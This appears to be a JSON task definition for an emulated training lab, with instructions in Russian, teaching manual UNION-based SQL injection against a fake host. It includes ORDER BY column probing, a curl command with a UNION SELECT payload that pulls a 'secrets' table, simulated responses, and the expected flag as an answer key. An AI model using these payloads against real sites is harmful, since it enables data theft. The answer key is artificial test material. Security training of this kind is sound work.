@@ -1,0 +1,42 @@
+{
+  "id": "web-sqli",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: ручной UNION-based SQLi\n\nЦель — `http://vuln.lab.local/product?id=1`. Параметр `id` инъектируем.\nОпредели число колонок и вытащи таблицу `secrets` вручную (без sqlmap).\n\n1. Норма: `curl -s 'http://vuln.lab.local/product?id=1'`.\n2. Определи колонки через `ORDER BY`: `?id=1 ORDER BY 3` — ок, `ORDER BY 4` — ошибка (3 колонки).\n3. UNION с тремя колонками (вторая — текст):\n\n   curl -s -G http://vuln.lab.local/product --data-urlencode 'id=1 UNION SELECT 1,value,3 FROM secrets'\n\n4. В ответе — флаг в поле `name`. Достань `grep 'nto{' | cut -d: -f6`, запиши в `found.txt`, набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vuln.lab.local/product)",
+      "cases": [
+        {
+          "match": "UNION",
+          "example": "-s -G http://vuln.lab.local/product --data-urlencode 'id=1 UNION SELECT 1,value,3 FROM secrets'",
+          "output": "[{\"id\":1,\"name\":\"Laptop\",\"price\":1200},{\"id\":1,\"name\":\"nto{m4nu4l_un10n_b34ts_th3_b0t}\",\"price\":3}]\n"
+        },
+        {
+          "match": "ORDER BY 4",
+          "example": "-s 'http://vuln.lab.local/product?id=1 ORDER BY 4'",
+          "output": "SQL error: no such column: 4\n"
+        },
+        {
+          "match": "product\\?id=1",
+          "example": "-s 'http://vuln.lab.local/product?id=1'",
+          "output": "[{\"id\":1,\"name\":\"Laptop\",\"price\":1200}]\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /product на vuln.lab.local.\n"
+    }
+  },
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{m4nu4l_un10n_b34ts_th3_b0t}"
+  }
+}
